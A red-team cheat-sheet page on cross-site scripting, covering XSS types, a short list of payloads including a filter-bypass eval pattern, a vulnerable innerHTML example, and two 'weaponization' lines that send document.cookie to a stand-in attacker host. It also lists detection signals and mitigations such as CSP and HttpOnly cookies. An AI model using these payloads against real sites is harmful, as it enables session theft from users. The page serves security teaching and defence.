---
title: "Cross-Site Scripting (XSS)"
category: "red-team"
tags: ["web", "xss", "owasp"]
platform: "web"
mitre: ["T1059.007"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Cross-Site Scripting (XSS)

## TL;DR
Injecting JS that executes in the victim's browser. Reflected (in the response), Stored (persisted), DOM (client-side). Impact: session theft, keylogging, actions on behalf of the victim.

## Payloads
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>fetch('https://atk/c?'+document.cookie)</script>

<!-- filter bypass -->
<img src=x onerror="eval(atob('...base64...'))">
<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
```

## DOM XSS – look for sinks
```javascript
// sources: location.hash, document.URL, referrer
// sinks: innerHTML, document.write, eval, setTimeout(string)
element.innerHTML = location.hash.slice(1);   // vulnerable
```

## Weaponization
```javascript
// Cookie/session exfiltration (if no HttpOnly)
new Image().src='https://atk/?c='+encodeURIComponent(document.cookie);
```

## Detection (Blue Team)
- WAF/logs: `<script`, `onerror=`, `javascript:`, encoded payloads.
- CSP violation reports (`report-uri`) — a signal of injection attempts.

## Mitigation / Hardening
- **Context-aware output encoding** (HTML/attr/JS/URL) + input validation.
- **CSP** (nonce/hash, `script-src 'self'`), `HttpOnly` + `SameSite` on session cookies.
- Frameworks with auto-escaping, avoid `innerHTML`/`dangerouslySetInnerHTML`.

## Sources
- [PortSwigger – XSS](https://portswigger.net/web-security/cross-site-scripting)
